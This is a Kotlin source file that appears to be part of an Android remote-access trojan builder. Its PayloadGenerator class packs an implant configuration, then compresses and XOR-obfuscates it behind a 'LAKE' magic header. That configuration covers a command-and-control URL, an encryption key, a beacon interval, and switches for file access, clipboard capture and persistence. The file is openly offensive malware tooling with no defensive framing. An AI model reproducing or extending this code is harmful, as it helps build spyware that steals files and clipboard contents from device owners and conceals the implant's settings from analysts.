package com.anonymousbeta.lakey.payload

import android.content.Context
import java.io.ByteArrayOutputStream
import java.util.zip.GZIPOutputStream

class PayloadGenerator(private val context: Context) {

    fun generate(config: PayloadConfig): ByteArray {
        val configJson = """
            {
              "c2": "${config.c2Url}",
              "key": "${config.encryptionKey}",
              "files": ${config.enableFileAccess},
              "clip": ${config.enableClipboard},
              "interval": ${config.beaconIntervalSeconds},
              "persist": ${config.persistence}
            }
        """.trimIndent()

        val raw = configJson.toByteArray(Charsets.UTF_8)
        val compressed = ByteArrayOutputStream()
        GZIPOutputStream(compressed).use { it.write(raw) }

        val key = config.encryptionKey.toByteArray()
        val data = compressed.toByteArray()
        val encrypted = ByteArray(data.size)
        for (i in data.indices) {
            encrypted[i] = (data[i].toInt() xor key[i % key.size].toInt()).toByte()
        }

        val magic = byteArrayOf(0x4C, 0x41, 0x4B, 0x45) // LAKE
        return magic + encrypted
    }
}